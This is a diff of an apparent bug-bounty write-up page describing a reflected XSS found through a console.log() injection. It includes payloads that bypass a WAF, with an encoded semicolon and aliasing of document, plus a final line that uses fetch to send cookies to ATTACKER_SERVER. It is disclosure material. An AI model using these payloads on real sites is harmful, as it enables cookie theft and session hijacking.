@@ -29,52 +29,60 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <p>We decided to carefully inspect the website's source code and realized that our input was inside a <code>console.log()</code> function.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/f4adceabac940d2709d032787a93236f.png" alt="Search Normal Result">
 
+    <hr>
     <h2>🛡️ Tag &lt;script&gt; Disallowed</h2>
     <p>We ran some basic tests that are performed to try to detect XSS attacks:</p>
     <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
     <p>All we got was that the Web Application Firewall (WAF) rejected our requests at the slightest sign of malicious activity.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/546b2f225d101e29c3a618b41645a151.png" alt="Blocked by WAF">
 
+    <hr>
     <h2>🔧 Close Javascript console.log String</h2>
     <p>Building on our initial discovery, we decided to try closing <code>console.log()</code> to insert code right after it using the following payload:</p>
     <pre><code>pwn');</code></pre>
     <p>We inserted <code>')</code> immediately after a string of text, which is what JavaScript needed to close <code>console.log()</code>. However, the semicolon symbol <code>;</code> was not being displayed.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/981af669ba5656927efdac5a9a8a30d5.png" alt="Closing console.log">
 
+    <hr>
     <h2>🧩 Append Javascript (Not Working)</h2>
     <pre><code>pwn');alert(1)</code></pre>
     <p>We tried again, but with some text after the semicolon. After several tests, we couldn't get the semicolon to appear. Worse still, everything after the semicolon didn't even appear in the text.</p>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/3fe13a271aa6a7120aa40703c0933005.png" alt="Where is semicolon">
 
+    <hr>
     <h2>🧱 Append Javascript (Bypass)</h2>
     <p>To make it work and start injecting code, we had to encode the semicolon in HTML format, changing it from <code>;</code> to <code>%3b</code>.</p>
     <pre><code>pwn')%3balert(1)</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/8c14339a9b0347ef35e6369350a6964b.png" alt="Bypass Semicolon">
 
+    <hr>
     <h2>💥 First Alert (Working)</h2>
     <p>Although the WAF did not accept the <code>&lt;script&gt;</code> tag, we managed to get it to render the <code>&lt;/script&gt;</code> tag, which was enough to carry out a REFLECTED XSS attack.</p>
     <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/077c7c91a0c356a8223587714c9805ac.png" alt="Alert 1">
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/8eaccafb86685327e7c52132978cb579.png" alt="Alert 1 HTML">
 
+    <hr>
     <h2>🚫 Second Alert (Firewall Blocks)</h2>
     <p>Once we had managed to execute an <code>alert()</code> on the web page, we wanted to go further and attempt to read a user's cookies. The WAF continued to reject our requests as soon as it detected suspicious strings such as <code>document.cookie</code>.</p>
     <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/546b2f225d101e29c3a618b41645a151.png" alt="Blocked by WAF">
 
+    <hr>
     <h2>🕵️ Firewall Bypass for Cookies</h2>
     <p>The WAF rejected strings like <code>document.cookie</code>. To achieve an effective WAF bypass, we created a variable <code>a</code> that contained <code>document</code>, and we requested <code>cookie</code> from that variable.</p>
     <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/fece825e7c28a4322c047f5534284e90.png" alt="Document Cookie Alert">
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/444b81920a1d001cbad4f1bdd1bf4e11.png" alt="Document Cookie Result">
 
+    <hr>
     <h2>🚀 Final Exploit (Cookies Exfiltration)</h2>
     <p>Instead of executing <code>alert</code>, we executed <code>fetch</code> to sending a request to a server controlled by the attacker.</p>
     <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/4dbf4c3c830303dce1488a8522b68935.png" alt="Final Exploit">
     <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/85f2210c208a80164de2adf36e1cc284.png" alt="Exfiltration Request">
 
-
+    <hr>
     <h2>📜 Official Recognition</h2>
     <div class="pdf-container">
       <iframe src="/assets/others/4b01725e-288b-4db5-a38c-1a37f827d215/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
@@ -84,6 +92,7 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
       <a href="/assets/others/4b01725e-288b-4db5-a38c-1a37f827d215/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
     </div>
 
+    <hr>
     <h2>🤝 Collaboration Details</h2>
     <p>This research was conducted in a joint effort with the following researchers:</p>
     <div class="collab-grid">
